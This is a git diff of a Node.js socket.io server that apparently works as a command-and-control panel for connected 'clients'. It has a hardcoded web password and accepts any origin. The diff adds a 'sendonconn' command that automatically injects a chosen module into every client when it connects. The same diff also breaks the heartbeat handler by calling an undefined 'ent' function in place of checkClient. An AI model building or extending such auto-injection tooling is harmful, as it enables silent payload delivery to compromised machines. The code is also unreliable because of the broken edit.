@@ -10,7 +10,7 @@ var readline = require('readline');
 var path = require('path');
 var pjson = require('./package.json');
 var webpassword = 'dviide';
-var clients = [], webclients = [], modules = [], lines = process.stdout.getWindowSize()[1], currkey = "";
+var clients = [], webclients = [], modules = [], olm, lines = process.stdout.getWindowSize()[1], currkey = "";
 var rl = readline.createInterface(process.stdin, process.stdout);
 io.set('origins', '*:*');
 
@@ -49,7 +49,7 @@ io.on('connection', function(socket){
     checkClient(data, '[C] Client connected with id: '.green + data.id.green.bold, socket);
   });
   socket.on("beat", function(data) {
-    checkClient(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket);
+    ent(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket);
   });
   socket.on("callback",function(data) {
     var ok = false;
@@ -152,6 +152,16 @@ clog(`
         }
       } else {
         clog('[M] Invalid arguments.'.red);
+      }
+    }
+    else if(args[0] == 'sendonconn') {
+      if(args[1]) {
+        getModuleContentsByName(args[1], function(data) {
+          olm = args[1];
+          clog('[M] Module: '.green + args[1].green.bold + ' will be injected on load!');
+        });
+      } else {
+        clog('[M] No module specified!'.red);
       }
     }
     else if(args[0] == 'sendtest') {
@@ -304,6 +314,9 @@ clog(`
       comb.id = data.id;
       comb.socket = socket;
       clients.push(comb);
+      if(olm) {
+        sendModuleBySocket(olm, socket);
+      }
     } else {
       if(message.indexOf('disconnected') === -1) {
         var comb = [];
